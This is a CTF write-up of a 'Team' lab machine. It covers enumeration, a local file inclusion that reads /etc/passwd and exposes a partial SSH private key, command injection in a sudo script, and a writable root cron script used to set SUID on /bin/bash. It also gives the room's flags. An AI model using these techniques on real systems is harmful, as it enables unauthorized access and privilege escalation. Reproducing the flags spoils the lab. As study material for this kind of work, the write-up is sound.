# Team Room Write‑up

## 1. Host Discovery

First, I verified that the target machine was alive by sending ICMP packets.

```bash
ping 10.128.168.46
```

Result:

```
64 bytes from 10.128.168.46: icmp_seq=1 ttl=62 time=118 ms
64 bytes from 10.128.168.46: icmp_seq=2 ttl=62 time=140 ms
```

The host responded successfully, confirming that the machine was reachable. ✅

---

# 2. Port Scanning

Next, I performed a service and version scan using **Nmap**.

```bash
nmap -sC -sV 10.128.168.46
```

Results:

|Port|Service|Version|
|---|---|---|
|21|FTP|vsftpd 3.0.5|
|22|SSH|OpenSSH 8.2p1|
|80|HTTP|Apache 2.4.41|

The web server was running **Apache**, so I started web enumeration.

---

# 3. Website Enumeration

When accessing the website, the page displayed the default Apache page and suggested adding a hostname.

```
Apache2 Ubuntu Default Page: It works!
If you see this add 'team.thm' to your hosts!
```

I added the domain to `/etc/hosts`:

```
10.128.168.46 team.thm
```

---

# 4. Directory Brute Forcing

I used **ffuf** with a common wordlist to discover hidden directories.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-u http://team.thm/FUZZ
```

Interesting results:

```
assets
images
scripts
robots.txt
```

However, none of these directories contained useful information.

---

# 5. Subdomain Enumeration

Since the main site didn't reveal anything useful, I performed **subdomain fuzzing**.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.team.thm" -u http://team.thm -fs 11366
```

Discovered subdomains:

```
www.dev.team.thm
dev.team.thm
www.team.thm
```

The **dev subdomain** looked promising.

---

# 6. Discovering a Vulnerable Parameter

Browsing `dev.team.thm`, I found the following URL:

```
http://dev.team.thm/script.php?page=teamshare.php
```

The `page` parameter suggested a possible **Local File Inclusion**.

To test this, I attempted to read `/etc/passwd`.

```
http://dev.team.thm/script.php?page=/etc/passwd
```

The server returned the contents of `/etc/passwd`, confirming the LFI vulnerability. 🎯

---

# 7. Automated LFI Discovery

To find sensitive files, I fuzzed the parameter using **ffuf** and an LFI wordlist.

Wordlist used:

```
https://github.com/rowbot1/lfi.list
```

Command:

```bash
ffuf -w lfi_paths.txt -u http://dev.team.thm/script.php?page=FUZZ -fs 1
```

Interesting result:

```
/etc/ssh/sshd_config
```

---

# 8. SSH Private Key Discovery

Inside the file, I discovered a commented SSH private key belonging to the user **dale**.

```
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY----- #b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn #NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
.
.
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7 #CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH 
#-----END OPENSSH PRIVATE KEY-----
```

This key can potentially be used to authenticate to the SSH service running on port **22**.

---

# 9. Initial Access

The next step is to:

1️⃣ Extract the private key  
2️⃣ Save it locally  
3️⃣ Change permissions

```bash
chmod 600 id_rsa
```

4️⃣ Connect via SSH

```bash
ssh -i id_rsa dale@10.128.168.46
```

This should provide an initial shell as the user **dale**.

---

# 10. User Flag

Listing the files in Dale’s home directory revealed the user flag.

```bash
ls
```

Output:

```
user.txt
```

Reading the file:

```bash
cat user.txt
```

Flag:

```
THM{6Y0TXHz7c2d}
```

---

# Privilege Escalation
# 11. Checking Sudo Permissions

The next step was checking which commands **dale** could run with sudo.

```bash
sudo -l
```

Output:

```
User dale may run the following commands on ip-10-128-168-46:
(gyles) NOPASSWD: /home/gyles/admin_checks
```

This means **dale can run the script `/home/gyles/admin_checks` as user `gyles` without a password.**

---

# 12. Analyzing the Script

Viewing the script:

```bash
cat /home/gyles/admin_checks
```

Script content:

```bash
#!/bin/bash
printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1

read -p "Enter name of person backing up the data: " name
echo $name >> /var/stats/stats.txt

read -p "Enter 'date' to timestamp the file: " error
printf "The Date is " $error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

The vulnerability is in this line:

```bash
printf "The Date is " $error
```

The variable **$error is not sanitized**, allowing **command injection**.

---

# 13. Exploiting the Script

The script was executed as **gyles**:

```bash
sudo -u gyles /home/gyles/admin_checks
```

When prompted for the second input, `/bin/bash` was entered.

```
Enter name of person backing up the data: hamza
Enter 'date' to timestamp the file: /bin/bash
```

This resulted in a shell as **gyles**.

To stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Now we have:

```
gyles@ip-10-128-168-46
```

---

# Root Privilege Escalation

# 14. Investigating Scheduled Tasks

While exploring the system, the directory `/opt/admin_stuff` was discovered.

```bash
cd /opt/admin_stuff
ls
```

Output:

```
script.sh
```

Viewing the script:

```bash
cat script.sh
```

Content:

```bash
#!/bin/bash
#I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"

#Back ups the sites locally
$main_site
$dev_site
```

This script runs **every minute via cron**.

---

# 15. Checking File Permissions

The scripts called by the cron job were inspected.

```bash
ls -al /usr/local/bin/main_backup.sh
```

Output:

```
-rwxrwxr-x 1 root admin 65 Jan 17 2021 /usr/local/bin/main_backup.sh
```

The script is **writable**, meaning it can be modified.

---

# 16. Privilege Escalation via Cron

Viewing the script:

```bash
cat /usr/local/bin/main_backup.sh
```

Content:

```bash
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
chmod +s /bin/bash
```

Because the script is executed by **root via cron**, we can append our own command.

```bash
echo "chmod +s /bin/bash" >> /usr/local/bin/main_backup.sh
```

After waiting for the cron job to execute, `/bin/bash` receives the **SUID bit**.

---

# 17. Getting Root Shell

Now run:

```bash
/bin/bash -p
```

Checking privileges:

```bash
whoami
```

Output:

```
root
```

---

# 18. Root Flag

Navigate to the root directory:

```bash
cd /root
ls
```

Output:

```
root.txt
```

Read the flag:

```bash
cat root.txt
```

Flag:

```
THM{fhqbznavfonq}
```

---

# Final Summary

Attack chain:

1. **Nmap scanning** revealed FTP, SSH, and HTTP  
2. Website suggested adding `team.thm` to `/etc/hosts`  
3. **Subdomain fuzzing** discovered `dev.team.thm`  
4. **LFI vulnerability** found in `script.php?page=`  
5. Retrieved **SSH private key for user dale**  
6. Logged in via **SSH**  
7. **Command injection** in `admin_checks` → user `gyles`  
8. Writable script executed by **root cron job**  
9. Added **SUID to bash** → root shell